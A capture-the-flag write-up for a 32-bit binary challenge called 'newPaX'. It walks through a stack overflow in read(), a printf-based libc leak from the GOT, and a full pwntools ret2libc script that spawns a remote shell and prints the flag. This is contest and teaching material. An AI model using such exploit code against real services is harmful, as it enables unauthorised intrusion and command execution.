newPaX
=======

In this challenge we have the following binary:
```
./newPaX: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=e628ce08de6b38dcb53ead246e6af5ac90898dae, not stripped
```

The following is a disassembly of the main and vuln functions:

```nasm
Dump of assembler code for function main:
   0x08048685 <+0>:	lea    ecx,[esp+0x4]
   0x08048689 <+4>:	and    esp,0xfffffff0
   0x0804868c <+7>:	push   DWORD PTR [ecx-0x4]
   0x0804868f <+10>:	push   ebp
   0x08048690 <+11>:	mov    ebp,esp
   0x08048692 <+13>:	push   ecx
   0x08048693 <+14>:	sub    esp,0x4
   0x08048696 <+17>:	call   0x80486bd <__x86.get_pc_thunk.ax>
   0x0804869b <+22>:	add    eax,0x1965
   0x080486a0 <+27>:	call   0x80485c0 <nvm_init>
   0x080486a5 <+32>:	call   0x804861d <nvm_timeout>
   0x080486aa <+37>:	call   0x8048656 <vuln>
   0x080486af <+42>:	mov    eax,0x0
   0x080486b4 <+47>:	add    esp,0x4
   0x080486b7 <+50>:	pop    ecx
   0x080486b8 <+51>:	pop    ebp
   0x080486b9 <+52>:	lea    esp,[ecx-0x4]
   0x080486bc <+55>:	ret
End of assembler dump.

Dump of assembler code for function vuln:
   0x08048656 <+0>:	push   ebp
   0x08048657 <+1>:	mov    ebp,esp
   0x08048659 <+3>:	push   ebx
   0x0804865a <+4>:	sub    esp,0x34
   0x0804865d <+7>:	call   0x80486bd <__x86.get_pc_thunk.ax>
   0x08048662 <+12>:	add    eax,0x199e
   0x08048667 <+17>:	sub    esp,0x4
   0x0804866a <+20>:	push   0xc8
   0x0804866f <+25>:	lea    edx,[ebp-0x30]
   0x08048672 <+28>:	push   edx
   0x08048673 <+29>:	push   0x0
   0x08048675 <+31>:	mov    ebx,eax
   0x08048677 <+33>:	call   0x80483f0 <read@plt>
   0x0804867c <+38>:	add    esp,0x10
   0x0804867f <+41>:	nop
   0x08048680 <+42>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x08048683 <+45>:	leave
   0x08048684 <+46>:	ret
```


We are able to overflow the buffer because read() accepts more bytes than the buffer has allocated for it.  Hence we are able to overwrite EIP by sending 52 bytes
of junk

```python
#!/usr/bin/python3
from pwn import *

def exploit():
	OFFSET = 52

	# Connect to target
	conn = remote('172.17.0.2', 5001)

	payload  = b""
	payload += b"A" * OFFSET
	payload += p32(0xdeadbeef)

	conn.sendline(payload)

if __name__ == "__main__":
	exploit()
```

```nasm
Program received signal SIGSEGV, Segmentation fault.
0xdeadbeef in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────────────[ REGISTERS ]──────────────────────────────────────
 EAX  0x39
 EBX  0x41414141 ('AAAA')
 ECX  0xfffffffffcd18a48 ◂— 0xfcd18a48
 EDX  0xc8
 EDI  0x0
 ESI  0xffffffffed86d000 ◂— 0xed86d000
 EBP  0x41414141 ('AAAA')
 ESP  0xfffffffffcd18a80 —▸ 0xed8a390a (_dl_init+170) ◂— and    al, 0x2c
 EIP  0xdeadbeef
───────────────────────────────────────[ DISASM ]────────────────────────────────────────
Invalid address 0xdeadbeef
────────────────────────────────────────[ STACK ]────────────────────────────────────────
00:0000│   0xfcd18a80 —▸ 0xed8a390a (_dl_init+170) ◂— and    al, 0x2c
01:0004│   0xfcd18a84 —▸ 0xfcd18aa0 ◂— 0x1
02:0008│   0xfcd18a88 ◂— 0x0
03:000c│   0xfcd18a8c —▸ 0xed6ade81 (__libc_start_main+241) ◂— add    esp, 0x10
04:0010│   0xfcd18a90 —▸ 0xed86d000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1d7d6c
... ↓
06:0018│   0xfcd18a98 ◂— 0x0
07:001c│   0xfcd18a9c —▸ 0xed6ade81 (__libc_start_main+241) ◂— add    esp, 0x10
──────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────
 ► f 0 deadbeef
   f 1 ed8a390a _dl_init+170
   f 2        1
Program received signal SIGSEGV (fault address 0xdeadbeef)

```

Much like the previous exploit, we forge a call to printf() with the argument of READ@GOT in order to leak READ in the remote target's libc.  The methodology remains the same, we
leak read(), search on the libc database for the remote target's libc, adjust the base address of libc and find gadgets using the newly downloaded LIBC.

The following is the response from the server with the leak:

```
$ python3 ./exploit.py
[+] Opening connection to pwn.darkarmy.xyz on port 5001: Done
b'\xc0F\xe2\xf7'
READ LEAK @ 0xf7e246c0
```

Searching the database, we see the following LIBC matches a READ() function on that offset:

```
libc6-i386_2.27-3ubuntu1.2_amd64.so
```

The final exploit is:

```python
#!/usr/bin/python3
from pwn import *

def leak_read():
	PRINTF_PLT = 0x8048400
	READ_GOT   = 0x0804a00c
	MAIN = 0x08048685

	r  = b""
	r += p32(PRINTF_PLT)
	r += p32(MAIN)
	r += p32(READ_GOT)

	return r

def gen_system_shell(binsh, system):
	r  = b""
	r += p32(system)
	r += p32(0xdeadbeef)
	r += p32(binsh)

	return r

def exploit():
	libc = ELF("libc6-i386_2.27-3ubuntu1.2_amd64.so")
	READ_LIBC = libc.sym['read']
	OFFSET = 52


	# Connect to target, leak read
	conn  = remote('pwn.darkarmy.xyz', 5001)

	payload  = b""
	payload += b"A" * OFFSET
	payload += leak_read()

	conn.clean()
	conn.sendline(payload)
	data = conn.recv(4).rstrip()
	print(data)
	read_leak = int.from_bytes(data, 'little', signed=False)

	# Recalculate libc.address with remote address space
	print("READ LEAK @ 0x{:08x}\n".format(read_leak))
	libc.address = read_leak - READ_LIBC
	print("LIBC_ADDRESS @ 0x{:08x}\n".format(libc.address))

	# Obtain the gadgets of remote libc within the context of remote address space
	BINSH = next(libc.search(b'/bin/sh'))
	SYSTEM = libc.sym['system']

	print("BINSH @ 0x{:08x}".format(BINSH))
	print("SYSTEM @ 0x{:08x}".format(SYSTEM))

	# Stage 2, pop a shell
	payload  = b""
	payload += b"A" * OFFSET
	payload += gen_system_shell(BINSH, SYSTEM)

	conn.clean()
	conn.sendline(payload)
	conn.interactive()

if __name__ == "__main__":
	exploit()
```

```
$ python3 ./exploit.py
[*] './libc6-i386_2.27-3ubuntu1.2_amd64.so'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to pwn.darkarmy.xyz on port 5001: Done
b'\xc0V\xe0\xf7'
READ LEAK @ 0xf7e056c0

LIBC_ADDRESS @ 0xf7d20000

BINSH @ 0xf7e9bb8f
SYSTEM @ 0xf7d5cd80
[*] Switching to interactive mode
$ ls -l
total 32
drwxr-x--- 1 0 1000 4096 Sep 26 04:29 bin
drwxr-x--- 1 0 1000 4096 Sep 26 04:29 dev
-rwxr----- 1 0 1000   49 Sep 21 17:58 flag.txt
drwxr-x--- 1 0 1000 4096 Sep 26 04:29 lib
drwxr-x--- 1 0 1000 4096 Sep 26 04:29 lib32
drwxr-x--- 1 0 1000 4096 Sep 26 04:29 lib64
-rwxr-x--- 1 0 1000 7568 Sep 19 11:14 newPaX
$ cat ./flag.txt
darkCTF{f1n4lly_y0u_r3s0lv3_7h1s_w17h_dlr3s0lv3}
```
